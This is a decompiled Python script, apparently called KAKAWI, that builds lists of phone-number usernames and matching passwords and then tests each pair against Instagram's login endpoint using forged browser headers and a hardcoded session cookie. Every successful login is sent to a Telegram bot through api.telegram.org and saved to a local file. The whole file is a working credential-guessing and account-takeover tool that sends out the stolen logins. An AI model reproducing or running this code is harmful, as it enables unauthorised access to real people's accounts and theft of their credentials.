import pyfiglet
Z = '\x1b[2;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
P55 = pyfiglet.figlet_format('KAKAWI')
k8 = 'KAKAWI'
import requests
ss = '2'
rs = '1'
if '1' == rs:
    print(Z + P55)
else:
    print(Z + u'\n\t\n\t                               - Yuor sub , End\n\t                            \u062a\u0648\u0627\u0635\u0644 \u0645\u0639 \u0627\u0644\u0645\u0637\u0648\u0631 \u0644\u062a\u0641\u0639\u064a\u0644\u0647\u0627 @bd_bd00')
    exit()
ii = input(Z1 + '     - password :                                                                                                    ')
if k8 in ii:
    print(' ')
else:
    print('Erorr pass')
    exit()
import os, pyfiglet
P56 = pyfiglet.figlet_format('             - KAKAWI ` 4P')
print(X + P56)
print('____________________________________________________________________________________________________')
import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
import sys, time
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.008)
j('\x1b[1;34m')
print('\x1b[1;33m   ')
KAKAWI = input('\n\t\t   [1] - cReaT comBo :\n  \t\n\t\t   [2] - sTaRt cHeakeR :\n  \t\n\t\t   [CH] - @bd_bd00\n  \n\t\t  \x1b[2;31m [KAKAWI] - By KAKAWI-@bd_bd00\n  \n  \n     - chose : ')
KAKAWI = int(KAKAWI)
if KAKAWI == 1:
    import random, sys, os, time
    os.system('rm KAKAWI.txt')
    hi = 'Hi..'
    print(hi)
    uesr = input('   - Chose code : ')
    print('   ')
    hmo1 = input('   - Input Number : ')
    print(u'\n\n____________:Ka!\u0670____________\n\n\n')
    pass1 = input('     075 - 077 - 078 - 079\n\n- Chose fRom this : ')
    print(u'\n\n____________:Ka!\u0670____________\n\n\n')
    rhaby = input('   - How many Combo 3x : ')
    rhaby = int(rhaby)
    print('   ')
    j(u'____________:Ka!\u0670_______________')
    hmoo2 = 8
    for password in range(rhaby):
        password = ''
        for item in range(hmoo2):
            hmooo3 = ''
        else:
            for item in range(hmoo2):
                hmooo3 = ''.join(random.sample(hmo1, hmoo2))
            else:
                print(uesr + pass1 + hmooo3 + ':' + pass1 + hmooo3)
                with open('KAKAWI.txt', 'a') as (x):
                    x.write(uesr + pass1 + hmooo3 + ':' + pass1 + hmooo3 + '\n')

j('__________KAKAWI__________\n     START CHEKER\n__________KAKAWI__________\n')
if KAKAWI == 2:
    import requests
import os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
E = '\x1b[1;34m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
ID = input('\n\n    - Enter Your ID : ')
token = input('       Enter YOUR TOKEN : ')
r = requests.Session()
Acc = open('KAKAWI.txt', 'r').read().splitlines()
for Accounts in Acc:
    username = Accounts.split(':')[0]
    password = Accounts.split(':')[1]
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {'accept':'*/*', 
     'accept-encoding':'gzip,deflate,br', 
     'accept-language':'en-US,en;q=0.9,ar;q=0.8',

'content-length':'269', 
     'content-type':'application/x-www-form-urlencoded', 
     'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-', 
     'origin':'https://www.instagram.com', 
     'referer':'https://www.instagram.com/', 
     'sec-fetch-dest':'empty', 
     'sec-fetch-mode':'cors', 
     'sec-fetch-site':'same-origin', 
     'user-agent':generate_user_agent(), 
     'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8', 
     'x-ig-app-id':'936619743392459', 
     'x-ig-www-claim':'0', 
     'x-instagram-ajax':'8a8118fa7d40', 
     'x-requested-with':'XMLHttpRequest'}
    data = {'username':username, 
     'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password), 
     'queryParams':'{}', 
     'optIntoOneTap':'false'}
    req_login = r.post(url, headers=headers, data=data, proxies=None)
    if 'userId' in req_login.text:
        tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}u'&text= \u2022 \U0001d46f\U0001d486\U0001d48d\U0001d48d\U0001d490 - \U0001d480\U0001d490\U0001d496\U0001d479 \U0001d46f\U0001d496\U0001d48f\U0001d495 \u2654\ufe0e\n\n- \U0001d477\U0001d46f \u27aa '{username}u' \u2713 \n- \U0001d477\U0001d47a \u27aa '{password}u' \u2713\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2022 \U0001d405\U0001d42b\U0001d40e\U0001d426 : @bd_bd00 -K- @bd_bd00 '"
        i = requests.post(tlg)
        print(G + u'\U0001d63c\U0001d658\U0001d658 \u27aa ' + username + u' \u2729 ' + password + u'\u2713')
        with open('insta.txt', 'a') as (hmo):
            hmo.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
    else:
        print(E + u'\U0001d469\U0001d482\U0001d46b \u27aa ' + username + Z + u' \U000169b9 ' + X + 'Not allow' + u'  \u232b\n        \n        -\n        ')
# okay decompiling /sdcard/Download/KAKAWI2.pyc